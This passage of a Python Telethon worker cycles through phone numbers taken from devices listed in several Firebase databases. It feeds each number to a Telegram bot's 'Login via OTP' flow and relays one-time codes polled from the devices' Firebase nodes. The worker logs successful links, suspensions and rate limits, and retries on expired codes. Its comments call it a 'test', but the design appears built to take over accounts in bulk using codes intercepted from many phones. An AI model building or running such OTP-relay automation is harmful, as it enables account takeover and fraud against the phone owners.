            f"({OTP_TIMEOUT_SECONDS}s)"
        )

        await asyncio.sleep(
            OTP_TIMEOUT_SECONDS
        )

        if (
            current_job
            and current_job["id"] == job_id
            and state == "WAITING_FOR_OTP"
        ):
            phone = current_job.get("device_phone") or current_job.get("number")
            retries = current_job.get("otp_retries", 0)

            if retries < 1:
                current_job["otp_retries"] = 1
                print()
                print("=" * 60)
                print(f"[{now()}] OTP TIMEOUT (60s) for {phone} - RETRYING ONCE (Attempt 2 of 2)")
                print("=" * 60)
                await restart_current_job_login("OTP timeout - retrying once")
            else:
                print()
                print("=" * 60)
                print(f"[{now()}] OTP TIMEOUT (60s) after retry for {phone} - MAX RETRIES REACHED")
                print("Marking as EXPIRED and advancing to next number...")
                print("=" * 60)
                await request_cancel_and_finish(
                    "expired",
                    "OTP response timeout (max retries reached)",
                    "OTP timeout",
                )

    except asyncio.CancelledError:

        print(
            f"[{now()}] OTP timer cancelled"
        )


def start_otp_timer(job_id):

    global otp_timer_task

    if otp_timer_task:

        otp_timer_task.cancel()

    otp_timer_task = asyncio.create_task(
        otp_timeout_worker(job_id)
    )


async def stop_otp_timer():

    global otp_timer_task

    if not otp_timer_task:
        return

    task = otp_timer_task

    otp_timer_task = None

    task.cancel()

    try:

        await task

    except asyncio.CancelledError:

        pass


# ============================================================
# VERIFICATION TIMER
# ============================================================

async def verification_timeout_worker(job_id):
    try:
        await asyncio.sleep(45)
        if (
            current_job
            and current_job["id"] == job_id
            and state == "VERIFYING"
        ):
            print(f"[{now()}] VERIFICATION TIMEOUT (45s exceeded) | job={job_id}")
            await request_cancel_and_finish(
                "timeout",
                "Verification response timeout (45s exceeded)",
                "Verification timeout",
            )
    except asyncio.CancelledError:
        pass


def start_verification_timer(job_id):
    global verification_timer_task
    if verification_timer_task:
        verification_timer_task.cancel()
    verification_timer_task = asyncio.create_task(
        verification_timeout_worker(job_id)
    )


async def stop_verification_timer():
    global verification_timer_task
    if not verification_timer_task:
        return
    task = verification_timer_task
    verification_timer_task = None
    task.cancel()
    try:
        await task
    except asyncio.CancelledError:
        pass


# ============================================================
# CANCEL TELEGRAM CONVERSATION
# ============================================================

async def cancel_current_conversation(
    reason=""
):

    global cancel_in_progress

    if cancel_in_progress:

        print(
            "Cancel already in progress."
        )

        return

    cancel_in_progress = True

    print()
    print("=" * 60)
    print("CANCELLING CURRENT CONVERSATION")
    print("Reason:", reason)
    print("=" * 60)

    set_state(
        "CANCELLING"
    )

    try:

        await client.send_message(
            BOT_USERNAME,
            "/cancel",
        )

        print(
            f"[{now()}] /cancel sent"
        )

        await asyncio.sleep(2)

    except Exception as e:

        print(
            f"[{now()}] Cancel error: {e}"
        )

    finally:

        cancel_in_progress = False


# ============================================================
# FINISH CURRENT JOB
# ============================================================

async def finish_current_job():

    global current_job
    global login_clicked_for_job
    global pending_finish_after_cancel
    global pending_finish_status
    global pending_finish_error
    global pending_restart_after_cancel
    global test_response_baseline_signatures

    await stop_otp_timer()
    await stop_verification_timer()
    await stop_response_poll()

    if current_job:

        print(
            f"[{now()}] FINISHED JOB "
            f"{current_job['id']}"
        )

    current_job = None

    login_clicked_for_job = None

    pending_finish_after_cancel = False
    pending_finish_status = ""
    pending_finish_error = ""
    pending_restart_after_cancel = False
    test_response_baseline_signatures = set()

    set_state(
        "IDLE"
    )

# ============================================================
# DEVICE SELECTION
# ============================================================

def load_device_pool(force=False):
    """Return the combined in-memory device pool; refresh only when required."""
    global device_pool
    global device_pool_loaded

    if force or not device_pool_loaded:
        # This is intentionally synchronous at the call boundary only for
        # compatibility. Normal worker startup performs the async refresh first.
        devices = refresh_device_registry_sync()
        device_pool = [
            d for d in devices
            if d.get("online") and normalize_phone(d.get("phone"))
        ]
        device_pool_loaded = True

    return device_pool


def _mark_device_state(device, new_state):
    key = f"{device.get('database')}|{device.get('device_id')}"
    if key in device_registry:
        device_registry[key]["state"] = new_state


def select_next_device():
    """Select the next available device from the combined registry."""
    global used_device_ids

    devices = [
        d for d in device_pool
        if d.get("online")
        and normalize_phone(d.get("phone"))
    ]

    for device in devices:
        # Database + device ID prevents collisions between Firebase projects.
        device_key = f"{device.get('database')}|{device.get('device_id')}"
        phone = device.get("phone")

        if device_key in used_device_ids:
            continue

        if is_number_already_processed(phone):
            norm = normalize_phone(phone)
            rec = processed_numbers.get(norm, {})
            st = rec.get("status", "COMPLETED")
            _mark_device_state(device, st.upper())
            continue

        used_device_ids.add(device_key)
        _mark_device_state(device, "PROCESSING")

        dashboard_log(
            f"Selected {device.get('device_id')} ({phone}) from "
            f"{device.get('database')}"
        )
        return device

    dashboard_log("No unused online device with a number is available.")
    return None


# ============================================================
# TELEGRAM UI STATE HELPERS
# ============================================================

async def get_latest_bot_message():
    """Read the latest bot message so a stale conversation can be resumed safely."""
    messages = await client.get_messages(BOT_USERNAME, limit=1)
    if not messages:
        return None
    return messages[0]


def find_login_button(message):
    """Return (row, column) for Login via OTP, or None."""
    buttons = getattr(message, "buttons", None)
    if not buttons:
        return None

    for row_index, row in enumerate(buttons):
        for button_index, button in enumerate(row):
            if not getattr(button, "text", None):
                continue
            if "login via otp" in button.text.lower():
                return row_index, button_index

    return None


async def submit_selected_test_number():
    """Submit the selected device number to the controlled test bot."""
    if not current_job:
        return False

    raw_phone = current_job.get("device_phone", "")

    try:
        test_number = extract_local_10_digit_number(raw_phone)
    except ValueError as e:
        print(f"[{now()}] Device number error: {e}")
        await request_cancel_and_finish(
            "failed",
            str(e),
            "Invalid selected device number",
        )
        return False

    current_job["test_number"] = test_number

    set_state("WAITING_FOR_NUMBER")

    sync_worker_status_all("waiting_for_number", current_job)
    try:
        update_job_status(
            current_job,
            "waiting_for_number",
        )
    except Exception:
        pass

    print()
    print("NUMBER REQUEST RECEIVED / RESUMED")
    print("Selected device:", current_job["device_id"])
    print("Selected Firebase:", current_job["device_database"])
    print("Selected test number:", test_number)

    # Capture baseline BEFORE submitting the number so incoming OTP is never swallowed
    try:
        capture_response_baseline()
    except Exception as e:
        print(f"[{now()}] Pre-submit baseline capture error: {e}")

    current_job["number_submitted_at"] = time.time()
    current_job["submitted_otps"] = set()

    await client.send_message(BOT_USERNAME, test_number)
    print(f"[{now()}] Number submitted to bot.")

    return True


async def click_login_button_from_message(message):
    """Click Login via OTP exactly once for the current job."""
    global login_click_in_progress
    global login_clicked_for_job

    if not current_job:
        return False

    job_id = current_job["id"]
    button_position = find_login_button(message)

    if button_position is None:
        return False

    if login_clicked_for_job == job_id:
        print("Login via OTP already clicked for this job.")
        return True

    if login_click_in_progress:
        print("Login button click already in progress.")
        return True

    login_click_in_progress = True

    try:
        row_index, button_index = button_position

        print()
        print("CLICKING LOGIN VIA OTP")
        print("Row:", row_index)
        print("Column:", button_index)

        await message.click(row_index, button_index)

        login_clicked_for_job = job_id
        set_state("WAITING_FOR_NUMBER")

        sync_worker_status_all("waiting_for_number", current_job)
        try:
            update_job_status(
                current_job,
                "waiting_for_number",
            )
        except Exception:
            pass

        print("Login via OTP clicked successfully.")
        return True

    except Exception as e:
        print("Failed to click Login via OTP:", e)
        await request_cancel_and_finish(
            "failed",
            f"Login button click failed: {e}",
            "Login button click failed",
        )
        return False

    finally:
        login_click_in_progress = False


async def prepare_telegram_flow_for_job():
    """Resume an existing Telegram UI if possible; otherwise reset it."""
    global pending_restart_after_cancel

    if not current_job:
        return

    latest = await get_latest_bot_message()

    if latest:
        text = (latest.raw_text or "").strip()
        lower = text.lower()

        print()
        print("LATEST TELEGRAM UI CHECK")
        safe_print(text or "<no text>")

        # If the previous conversation is already waiting for the number,
        # do not send /start and do not click anything again.
        if "enter the 10-digit" in lower:
            await submit_selected_test_number()
            return

        # If the menu is already present, click Login directly.
        if "welcome to" in lower and getattr(latest, "buttons", None):
            if find_login_button(latest) is not None:
                await click_login_button_from_message(latest)
                return

        # Already cancelled: start a fresh menu flow.
        if "conversation cancelled" in lower:
            set_state("WAITING_FOR_MENU")
            await send_start_if_needed(force=True)
            return

    # Anything else can represent a stale/pending conversation. Reset it
    # first, then let the cancellation handler start /start.
    print(f"[{now()}] Telegram is not in the expected UI state.")
    print(f"[{now()}] Sending /cancel, then /start after cancellation.")

    pending_restart_after_cancel = True
    await cancel_current_conversation("Reset stale Telegram conversation")


# ============================================================
# START NEXT FIREBASE JOB
# ============================================================

async def start_next_job():
    """Start a test run from queued Firebase jobs or fall back to device selection.

    First checks automation/jobs for status=='queued' from the frontend UI.
    If found, claims and runs that job.
    Otherwise falls back to automatic device selection.
    """
    global current_job
    global login_clicked_for_job

    async with next_job_lock:
        if current_job is not None:
            print("A job is already running:", current_job["id"])
            return

        # 1. First priority: Check for queued jobs dispatched from the frontend UI
        auth_db = _get_auth_db()
        queued_item = get_next_queued_job(auth_db)
        if queued_item:
            database = queued_item["database"]
            job_id = queued_item["jobId"]
            job_data = queued_item.get("job", {})
            device_id = str(job_data.get("deviceId", job_data.get("device_id", ""))).strip()
            phone_val = str(queued_item.get("number") or job_data.get("number", "")).strip()

            try:
                local_number = extract_local_10_digit_number(phone_val)
            except ValueError as e:
                print(f"[{now()}] Skipping queued job {job_id} with invalid number: {e}")
                update_job_status(queued_item, "failed", str(e))
                return

            current_job = {
                "id": job_id,
                "jobId": job_id,
                "name": job_data.get("name", args.name),
                "number": local_number,
                "device_id": device_id,
                "device_database": database,
                "device_phone": phone_val,
                "database": database,
                "source": "frontend-queue",
                "job": job_data,
                "otp_retries": 0,
                "stuck_retries": 0,
            }

            login_clicked_for_job = None

            print()
            print("=" * 60)
            print("CLAIMED QUEUED JOB FROM FRONTEND UI")
            print("=" * 60)
            print("Job ID:", job_id)
            print("Device ID:", device_id)
            print("10-digit test number:", local_number)
            print("Database:", database)
            print("=" * 60)

            update_job_status(
                current_job,
                "processing",
            )
            sync_worker_status_all("processing", current_job)

            set_state("STARTING")

            try:
                await prepare_telegram_flow_for_job()
            except Exception as e:
                print(f"[{now()}] Failed to start Telegram flow: {e}")
                update_job_status(
                    current_job,
                    "failed",
                    str(e),
                )
                sync_worker_status_all("error", current_job, str(e))
                current_job = None
                login_clicked_for_job = None
                set_state("IDLE")
            return

        # 2. Fallback: Automatic device selection from local pool
        device = select_next_device()

        if device is None:
            set_state("IDLE")
            try:
                sync_worker_status_all("idle", None)
            except Exception:
                pass
            print(f"[{now()}] No queued jobs or unused devices. Waiting...")
            return

        try:
            local_number = extract_local_10_digit_number(device["phone"])
        except ValueError as e:
            print(f"[{now()}] Skipping device with invalid test number: {e}")
            return

        job_id = f"test-{datetime.now().strftime('%Y%m%d-%H%M%S')}-{device['device_id']}"

        current_job = {
            "id": job_id,
            "jobId": job_id,
            "name": args.name,
            "number": local_number,
            "device_id": device["device_id"],
            "device_database": device["database"],
            "device_phone": device["phone"],
            "database": device["database"],
            "source": "automatic-device-selection",
            "job": {
                "name": args.name,
                "number": local_number,
                "device_id": device["device_id"],
            },
            "otp_retries": 0,
            "stuck_retries": 0,
        }

        login_clicked_for_job = None

        print()
        print("=" * 60)
        print("STARTING AUTOMATIC DEVICE TEST")
        print("=" * 60)
        print("Test name:", args.name)
        print("Job:", job_id)
        print("Device ID:", device["device_id"])
        print("Device phone:", device["phone"])
        print("10-digit test number:", local_number)
        print("Device Firebase:", device["database"])
        print("=" * 60)

        # The selected device is the source of truth for this run.
        sync_worker_status_all("processing", current_job)

        set_state("STARTING")

        try:
            await prepare_telegram_flow_for_job()
        except Exception as e:
            print(f"[{now()}] Failed to send /start: {e}")
            sync_worker_status_all("error", current_job, str(e))
            current_job = None
            login_clicked_for_job = None
            set_state("IDLE")


# ============================================================
# FINISH + START NEXT
# ============================================================

async def finish_and_start_next(
    status,
    error=""
):

    global current_job
    global login_clicked_for_job
    global pending_finish_after_cancel
    global pending_finish_status
    global pending_finish_error

    if not current_job:

        return

    job = current_job

    job_id = job["id"]
    database = job["database"]

    update_job_status(
        job,
        status,
        error,
    )

    await stop_otp_timer()
    await stop_verification_timer()
    await stop_response_poll()

    # Record ALL numbers in persistent numbers registry and Firebase!
    phone = job.get("device_phone") or job.get("number")
    if phone:
        record_processed_number(
            phone=phone,
            status=status,
            reason=error or status,
            device=job,
            attempts=job.get("otp_retries", 0) + 1,
        )

    if job.get("device_id"):
        matching_key = f"{job.get('device_database')}|{job.get('device_id')}"
        if status in {"successful", "success", "completed"}:
            if matching_key in device_registry:
                device_registry[matching_key]["state"] = "COMPLETED"
        else:
            if matching_key in device_registry:
                device_registry[matching_key]["state"] = status.upper()

    current_job = None

    login_clicked_for_job = None

    pending_finish_after_cancel = False
    pending_finish_status = ""
    pending_finish_error = ""
    pending_restart_after_cancel = False

    set_state(
        "IDLE"
    )

    sync_worker_status_all(
        "idle",
        None,
    )

    await asyncio.sleep(2)

    await start_next_job()


# ============================================================
# TELEGRAM FLOW HELPERS
# ============================================================

async def send_start_if_needed(force=False):
    global last_start_sent_at

    loop = asyncio.get_running_loop()
    now_ts = loop.time()

    if (
        not force
        and last_start_sent_at
        and now_ts - last_start_sent_at < START_RETRY_SECONDS
    ):
        print(
            f"[{now()}] /start retry suppressed "
            f"(cooldown {START_RETRY_SECONDS}s)"
        )
        return False

    await client.send_message(
        BOT_USERNAME,
        "/start",
    )

    last_start_sent_at = now_ts

    print(
        f"[{now()}] /start sent"
    )

    return True


async def restart_current_job_login(reason=""):
    """Reset conversation and restart login for the current job (e.g. for retry once)."""
    global login_clicked_for_job
    global login_click_in_progress
    global pending_restart_after_cancel
    global last_telegram_activity

    if not current_job:
        return

    job_id = current_job["id"]
    phone = current_job.get("number")

    print()
    print("=" * 60)
    print("RESTARTING LOGIN PROCESS FOR CURRENT NUMBER")
    print(f"Reason: {reason}")
    print(f"Job: {job_id}")
    print(f"Phone: {phone}")
    print("=" * 60)

    # 1. Stop active timers and polling
    await stop_otp_timer()
    await stop_verification_timer()
    await stop_response_poll()

    # 2. Reset flags
    login_clicked_for_job = None
    login_click_in_progress = False

    # 3. Set pending restart flag so cancellation confirmation triggers /start
    pending_restart_after_cancel = True
    last_telegram_activity = time.monotonic()

    # 4. Set state to CANCELLING and worker status to retrying
    set_state("CANCELLING")
    sync_worker_status_all(
        "retrying",
        current_job,
    )

    # 5. Send /cancel to reset Telegram conversation cleanly
    try:
        await client.send_message(BOT_USERNAME, "/cancel")
        print(f"[{now()}] /cancel sent to reset conversation.")
    except Exception as e:
        print(f"[{now()}] Error sending /cancel: {e}")

    # 6. Fallback: Wait up to 3 seconds for cancellation confirmation from bot.
    # If bot doesn't reply (e.g. was already cancelled or silent), force /start directly.
    await asyncio.sleep(3)
    if pending_restart_after_cancel and current_job and state in {"CANCELLING", "CANCELLED"}:
        print(f"[{now()}] Cancellation confirmation fallback: sending /start directly...")
        pending_restart_after_cancel = False
        set_state("WAITING_FOR_MENU")
        try:
            await send_start_if_needed(force=True)
        except Exception as e:
            print(f"[{now()}] Error sending fallback /start: {e}")


async def request_cancel_and_finish(
    status,
    error="",
    reason="",
):
    global pending_finish_after_cancel
    global pending_finish_status
    global pending_finish_error

    if not current_job:
        return

    pending_finish_after_cancel = True
    pending_finish_status = status
    pending_finish_error = error

    set_state("CANCELLING")

    try:
        await cancel_current_conversation(
            reason or error or "Test flow error"
        )
    except Exception as e:
        print(f"[{now()}] Error sending cancel: {e}")

    # Fallback timeout: If the bot does not respond with cancellation confirmation within 3 seconds,
    # finish the job immediately so the worker is never stuck.
    await asyncio.sleep(3)
    if pending_finish_after_cancel and current_job:
        print(f"[{now()}] Cancel confirmation not received from bot within 3s. Force finishing job...")
        await finish_and_start_next(status, error or "Timeout waiting for cancel confirmation")


# ============================================================
# TELEGRAM MESSAGE HANDLER
# ============================================================

@client.on(
    events.NewMessage(
        chats=BOT_USERNAME
    )
)
async def message_handler(event):

    global current_job
    global login_click_in_progress
    global login_clicked_for_job
    global pending_finish_after_cancel
    global pending_finish_status
    global pending_finish_error
    global pending_restart_after_cancel

    async with message_handler_lock:

        if event.out:
            return

        text = (
            event.raw_text or ""
        ).strip()

        if not text:
            return

        lower = text.lower()

        print()
        print("-" * 60)
        print(f"[{now()}] BOT:")
        safe_print(text)

        # Sync latest bot message to Firebase so the web panel can display it live
        global latest_bot_message_text
        latest_bot_message_text = text[:300]
        try:
            sync_worker_status_all(
                state.lower(),
                current_job,
            )
        except Exception:
            pass

        # --------------------------------------------------------
        # CANCEL CONFIRMATION
        # --------------------------------------------------------
        if "conversation cancelled" in lower:

            print()
            print("CANCELLATION CONFIRMED")

            set_state("CANCELLED")

            if pending_finish_after_cancel and current_job:

                status = pending_finish_status or "failed"
                error = pending_finish_error or "Conversation cancelled"

                pending_finish_after_cancel = False
                pending_finish_status = ""
                pending_finish_error = ""

                await finish_and_start_next(
                    status,
                    error,
                )

                return

            if pending_restart_after_cancel and current_job:
                pending_restart_after_cancel = False
                print(f"[{now()}] Cancellation confirmed. Restarting /start for the same device.")
                set_state("WAITING_FOR_MENU")
                await send_start_if_needed(force=True)
                return

            # If cancelled without pending flags, finish active job or reset to idle
            if current_job:
                await finish_and_start_next(
                    "failed",
                    "Conversation cancelled",
                )
            else:
                set_state("IDLE")
                await finish_current_job()

            return

        # --------------------------------------------------------
        # NO ACTIVE JOB
        # --------------------------------------------------------
        if current_job is None:

            print("No active Firebase device job.")
            return

        job_id = current_job["id"]

        # --------------------------------------------------------
        # MAIN MENU
        # --------------------------------------------------------
        if (
            "welcome to" in lower
            and event.message.buttons
        ):

            print()
            print("MAIN MENU RECEIVED")
            set_state("MENU_RECEIVED")

            if find_login_button(event.message) is None:

                print(
                    f"[{now()}] Login via OTP button not present."
                )
                print(
                    f"[{now()}] Sending /start and waiting for UI."
                )

                set_state("WAITING_FOR_MENU")

                try:
                    await send_start_if_needed()
                except Exception as e:
                    print(
                        f"[{now()}] Failed to resend /start: {e}"
                    )

                return

            await click_login_button_from_message(event.message)
            return

        # --------------------------------------------------------
        # NUMBER REQUEST
        # --------------------------------------------------------
        if "enter the 10-digit" in lower:

            await submit_selected_test_number()
            return

        # --------------------------------------------------------
        # OTP REQUEST
        # --------------------------------------------------------
        if (
            "otp sent successfully" in lower
            or "enter the 6-digit otp" in lower
        ):

            set_state("WAITING_FOR_OTP")

            sync_worker_status_all(
                "waiting_for_otp",
                current_job,
            )
            try:
                update_job_status(
                    current_job,
                    "waiting_for_otp",
                )
            except Exception:
                pass

            print()
            print("OTP REQUEST RECEIVED")
            print(
                f"Starting {OTP_TIMEOUT_SECONDS}s timeout."
            )

            # Baseline is captured before number submission. Fallback only if missing.
            if not current_job.get("number_submitted_at"):
                try:
                    capture_response_baseline()
                except Exception as e:
                    print(
                        f"[{now()}] Could not capture response baseline: {e}"
                    )

            start_otp_timer(job_id)
            start_response_poll(job_id)

            return

        # --------------------------------------------------------
        # VERIFYING
        # --------------------------------------------------------
        if "verifying" in lower:

            await stop_otp_timer()
            await stop_response_poll()

            set_state("VERIFYING")
            start_verification_timer(job_id)

            sync_worker_status_all(
                "verifying",
                current_job,
            )

            return

        # --------------------------------------------------------
        # SUCCESS
        # --------------------------------------------------------
        if (
            "login successful" in lower
            or "successfully linked" in lower
        ):

            await stop_verification_timer()

            print()
            print("=" * 60)
            print("END-TO-END TEST SUCCESS")
            print("=" * 60)
            print("Job:", job_id)
            print("Device:", current_job.get("device_id"))
            print("Verification completed by Telegram bot.")
            print("Marking job completed and moving to next device...")

            await finish_and_start_next("successful")
            return

        # --------------------------------------------------------
        # CLASSIFIED BOT RESPONSES / FAILURES
        # --------------------------------------------------------
        classification = None
        if (
            "account is suspended" in lower
            or "account has been suspended" in lower
            or "suspended" in lower
            or "account has been blocked" in lower
            or "blocked" in lower
        ):
            classification = "suspended"

        elif (
            "attempts exceeded" in lower
            or "retry after" in lower
            or "too many attempts" in lower
            or "retry again" in lower
        ):
            classification = "rate_limited"

        elif (
            "otp expired" in lower
            or "code expired" in lower
            or "expired" in lower
        ):
            classification = "expired"

        elif (
            "invalid otp" in lower
            or "is invalid" in lower
            or "the otp you entered" in lower
            or "otp verification failed" in lower
            or "please send the 6-digit otp code again" in lower
        ):
            classification = "invalid_otp"

        elif (
            "invalid number format" in lower
            or "invalid phone" in lower
            or "invalid mobile" in lower
        ):
            classification = "invalid_number"

        elif any(
            phrase in lower
            for phrase in [
                "otp request failed",
                "login failed",
                "request failed",
                "unable to process",
                "something went wrong",
                "error occurred",
                "please send the mobile number again",
            ]
        ):
            classification = "failed"

        flow_states = {
            "WAITING_FOR_NUMBER",
            "WAITING_FOR_OTP",
            "VERIFYING",
        }

        stale_menu_error = (
            state in {"STARTING", "WAITING_FOR_MENU", "MENU_RECEIVED"}
            and "invalid number format" in lower
        )

        if classification and (state in flow_states or stale_menu_error):
            print()
            print(f"BOT REPORTED: {classification.upper()}")
            print("Job:", job_id)
            print("Device:", current_job.get("device_id"))
            print("Phone:", current_job.get("number"))
            print("Current state:", state)

            await stop_otp_timer()
            await stop_verification_timer()
            await stop_response_poll()

            # Handle OTP expiration / invalid OTP retry once:
            if classification in {"expired", "invalid_otp"}:
                retries = current_job.get("otp_retries", 0)
                if retries < 1:
                    current_job["otp_retries"] = 1
                    print()
                    print("=" * 60)
                    print(f"[{now()}] BOT REPORTED {classification.upper()} for {current_job.get('number')} - RETRYING ONCE (Attempt 2 of 2)")
                    print("=" * 60)
                    await restart_current_job_login(f"{classification} - retrying once")
                    return
                else:
                    print()
                    print("=" * 60)
                    print(f"[{now()}] BOT REPORTED {classification.upper()} for {current_job.get('number')} - MAX RETRIES REACHED")
                    print("Marking as EXPIRED and advancing to next number...")
                    print("=" * 60)
                    await request_cancel_and_finish(
                        "expired",
                        text,
                        f"{classification} after retry",
                    )
                    return

            # Stale number format in menu
            if stale_menu_error:
                pending_restart_after_cancel = True
                await cancel_current_conversation(
                    "Stale Telegram number-entry state"
                )
                return

            # For suspended, rate_limited, invalid_number, or generic failure:
            await request_cancel_and_finish(
                classification,
                text,
                f"Bot reported {classification}",
            )
            return

        # --------------------------------------------------------
        # STILL WAITING FOR UI
        # --------------------------------------------------------
        if state in {
            "STARTING",
            "WAITING_FOR_MENU",
            "MENU_RECEIVED",
        }:

            print(
                f"[{now()}] Waiting for the expected Telegram UI."
            )

            return

# ============================================================
# TELEGRAM CALLBACK MONITOR
# ============================================================

@client.on(
    events.CallbackQuery(
        chats=BOT_USERNAME
    )
)
async def callback_handler(event):

    print()
    print(
        "BUTTON CALLBACK"
    )

    print(
        "Data:",
        event.data,
    )


async def ui_control_loop():
    """Poll for UI control signals (/cancel, /start, skip, direct text) every 500ms."""
    global current_job
    global login_clicked_for_job

    while True:
        try:
            auth_db = _get_auth_db()
            if auth_db:
                ctrl = firebase_get(auth_db, "automation/control")
                if isinstance(ctrl, dict) and ctrl.get("action"):
                    action = str(ctrl.get("action", "")).strip().lower()
                    print()
                    print("=" * 60)
                    print(f"[{now()}] UI CONTROL SIGNAL RECEIVED: {action.upper()}")
                    print("=" * 60)
                    from firebase import firebase_delete
                    try:
                        firebase_delete(auth_db, "automation/control")
                    except Exception:
                        pass

                    if action == "cancel":
                        print(f"[{now()}] Processing UI force cancel...")
                        # 1. Stop all active timers
                        await stop_otp_timer()
                        await stop_verification_timer()
                        await stop_response_poll()

                        # 2. Mark active job as cancelled in Firebase
                        if current_job:
                            try:
                                update_job_status(current_job, "cancelled", "Cancelled by user from panel")
                            except Exception:
                                pass

                        # 3. Send /cancel to Telegram bot
                        try:
                            await cancel_current_conversation("UI force cancel")
                        except Exception:
                            pass

                        # 4. Finish job and reset worker state
                        await finish_current_job()
                        set_state("IDLE")
                        try:
                            sync_worker_status_all("idle", None)
                        except Exception:
                            pass
                        print(f"[{now()}] UI force cancel complete. Worker state is IDLE.")

                    elif action == "start":
                        print(f"[{now()}] Processing UI force start...")
                        try:
                            await send_start_if_needed(force=True)
                            set_state("WAITING_FOR_MENU")
                            sync_worker_status_all("waiting_for_menu", current_job)
                            print(f"[{now()}] UI force start sent successfully to Telegram.")
                        except Exception as start_err:
                            print(f"[{now()}] Error sending /start: {start_err}")

                    elif action == "skip":
                        print(f"[{now()}] Processing UI skip...")
                        if current_job:
                            phone = current_job.get("device_phone") or current_job.get("number")
                            if phone:
                                record_processed_number(phone, "failed", "Skipped by user from panel", current_job.get("device_id"))
                            try:
                                await cancel_current_conversation("Skipped by user")
                            except Exception:
                                pass
                            await finish_and_start_next("failed", "Skipped by user from panel")
                        else:
                            try:
                                await cancel_current_conversation("UI skip")
                            except Exception:
                                pass
                            await finish_current_job()
                            set_state("IDLE")

                    elif action in {"send", "command", "text"}:
                        cmd = str(ctrl.get("text") or ctrl.get("command") or "").strip()
                        if cmd:
                            print(f"[{now()}] UI DIRECT COMMAND TO BOT: '{cmd}'")
                            try:
                                await client.send_message(BOT_USERNAME, cmd)
                                print(f"[{now()}] Command '{cmd}' delivered to {BOT_USERNAME}")
                            except Exception as cmd_err:
                                print(f"[{now()}] Failed to send command '{cmd}': {cmd_err}")

        except asyncio.CancelledError:
            break
        except Exception as _ctrl_err:
            pass

        await asyncio.sleep(0.5)


# ============================================================
# WORKER LOOP
# ============================================================

async def worker_loop():

    print()
    print("=" * 60)
    print("FIREBASE + TELEGRAM WORKER")
    print("=" * 60)

    print("Bot:", BOT_USERNAME)
    print("OTP timeout:", OTP_TIMEOUT_SECONDS)
    print("Test name:", args.name)
    print("Keyword:", RESPONSE_KEYWORD)
    print("Cross-device OTP polling: ENABLED")
    print("Persistent successful numbers:", len(processed_success))
    print(
        "Device discovery: parallel Firebase clients nodes; "
        "active response polling: selected device Firebase only"
    )
    print("=" * 60)

    load_processed_numbers()
    dashboard_log(
        f"Loaded {len(processed_numbers)} previously logged number(s) "
        f"({len(processed_success)} successful)."
    )
    dashboard_log("Worker starting")
    dashboard_log("Performing initial parallel Firebase discovery...")

    await refresh_device_registry(force=True)

    registry_task = asyncio.create_task(registry_refresh_loop())
    dashboard_task = asyncio.create_task(dashboard_loop())
    watchdog_task = asyncio.create_task(stuck_watchdog_loop())
    control_task = asyncio.create_task(ui_control_loop())

    try:
        while True:
            try:
                if current_job is None:
                    await start_next_job()

                await asyncio.sleep(1)

            except Exception as e:
                dashboard_log(f"WORKER ERROR: {e}")

                if current_job:
                    update_job_status(
                        current_job,
                        "failed",
                        str(e),
                    )

                    try:
                        await cancel_current_conversation("Worker exception")
                    except Exception:
                        pass

                    await finish_current_job()

                await asyncio.sleep(3)

    finally:
        registry_task.cancel()
        dashboard_task.cancel()
        watchdog_task.cancel()
        control_task.cancel()

        await asyncio.gather(
            registry_task,
            dashboard_task,
            watchdog_task,
            control_task,
            return_exceptions=True,
        )


# ============================================================
# FIREBASE AUTH BRIDGE
# ============================================================

def _write_auth_status(status, extra=None):
    """Write authentication status back to Firebase so the UI can react."""
    db = _get_auth_db()
    if not db:
        return
    payload = {
        "status": status,
        "updatedAt": now(),
    }
    if extra:
        payload.update(extra)
    try:
        firebase_update(db, "automation/auth", payload)
    except Exception as exc:
        print(f"[auth-bridge] Could not write auth status: {exc}")


def _read_auth_field(field, timeout=120, poll_interval=2):
    """
    Block (synchronously) until the given field appears in automation/auth.
    Returns the string value, or raises RuntimeError on timeout.
    """
    db = _get_auth_db()
    if not db:
        raise RuntimeError("No Firebase database configured for auth bridge")

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = firebase_get(db, "automation/auth")
            if isinstance(data, dict):
                val = data.get(field, "")
                if val and str(val).strip():
                    return str(val).strip()
        except Exception as exc:
            print(f"[auth-bridge] Poll error: {exc}")
        time.sleep(poll_interval)

    raise RuntimeError(
        f"Auth bridge timeout: field '{field}' was not provided within {timeout}s"
    )


async def _firebase_phone_callback():
    """
    Telethon phone callback — waits for UI to write phone number
    to automation/auth.phone in Firebase.
    """
    print("[auth-bridge] Waiting for phone number from UI via Firebase...")
    _write_auth_status("waiting_for_phone")
    phone = await asyncio.to_thread(_read_auth_field, "phone", timeout=300)
    print(f"[auth-bridge] Got phone from Firebase: {phone}")
    _write_auth_status("waiting_for_code", {"phone": phone})
    return phone


async def _firebase_code_callback():
    """
    Telethon code callback — waits for UI to write the SMS/Telegram
    verification code to automation/auth.code in Firebase.
    """
    print("[auth-bridge] Waiting for verification code from UI via Firebase...")
    _write_auth_status("waiting_for_code")
    code = await asyncio.to_thread(_read_auth_field, "code", timeout=300)
    print(f"[auth-bridge] Got code from Firebase.")
    _write_auth_status("verifying_code")
    return code


async def _firebase_2fa_callback(hint=None):
    """
    Telethon 2FA callback — waits for UI to write the 2FA password
    to automation/auth.password in Firebase.
    """
    hint_str = f" (hint: {hint})" if hint else ""
    print(f"[auth-bridge] 2FA required{hint_str}. Waiting for password from UI via Firebase...")
    _write_auth_status("waiting_for_2fa", {"hint": hint or ""})
    password = await asyncio.to_thread(_read_auth_field, "password", timeout=300)
    print("[auth-bridge] Got 2FA password from Firebase.")
    _write_auth_status("verifying_2fa")
    return password


async def _start_with_firebase_auth():
    """
    Start the Telegram client using Firebase as the auth communication channel.

    If a valid session already exists, client.start() connects immediately
    without invoking any callbacks, so the UI flow is skipped silently.
    """
    print("[auth-bridge] Starting Telegram client (Firebase-driven auth)...")
    _write_auth_status("connecting")

    try:
        await client.start(
            phone=_firebase_phone_callback,
            code_callback=_firebase_code_callback,
            password=_firebase_2fa_callback,
        )
    except Exception as exc:
        _write_auth_status("error", {"error": str(exc)})
        raise

    me = await client.get_me()
    username = (
        getattr(me, "username", None)
        or getattr(me, "first_name", "unknown")
    )
    phone = getattr(me, "phone", "")

    print(f"[auth-bridge] Logged in as: {username} (phone: {phone})")
    _write_auth_status("connected", {
        "username": username,
        "phone": phone,
        "connectedAt": now(),
    })
    return me


# ============================================================
# MAIN
# ============================================================

async def main():

    print(
        "Connecting to Telegram..."
    )

    me = await _start_with_firebase_auth()

    username = (
        getattr(me, "username", None)
